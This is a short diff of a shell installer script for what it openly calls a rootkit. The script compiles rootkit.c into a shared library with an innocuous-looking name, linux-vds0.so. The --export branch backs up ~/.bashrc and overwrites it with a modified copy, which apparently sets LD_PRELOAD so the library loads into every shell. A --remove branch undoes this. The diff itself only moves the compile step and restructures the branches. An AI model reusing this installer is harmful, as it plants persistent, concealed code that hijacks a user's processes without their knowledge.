@@ -21,10 +21,10 @@ if [ "$#" -eq 2 ]; then
     echo -e "${RED}Too many arguments!${RESETCOL}"; show_usage
 fi
 
-# compile source
-gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl
 
 if [ "$@" == "--export" ]; then
+    # compile source
+    gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl
     # trust me, do not touch this file .bashrc.backup
     if [ ! -f "$BASHRCBACKUP" ]; then
         cp ~/.bashrc .bashrc.backup
@@ -33,8 +33,9 @@ if [ "$@" == "--export" ]; then
         cat .bashrc.mod > ~/.bashrc
         bash && clear
     fi
+fi
 
-elif [ "$@" == "--remove" ]; then
+if [ "$@" == "--remove" ]; then
     cat .bashrc.backup > .bashrc.mod; echo "unset LD_PRELOAD" >> .bashrc.mod
     cat .bashrc.mod > ~/.bashrc
     rm linux-vds0.so
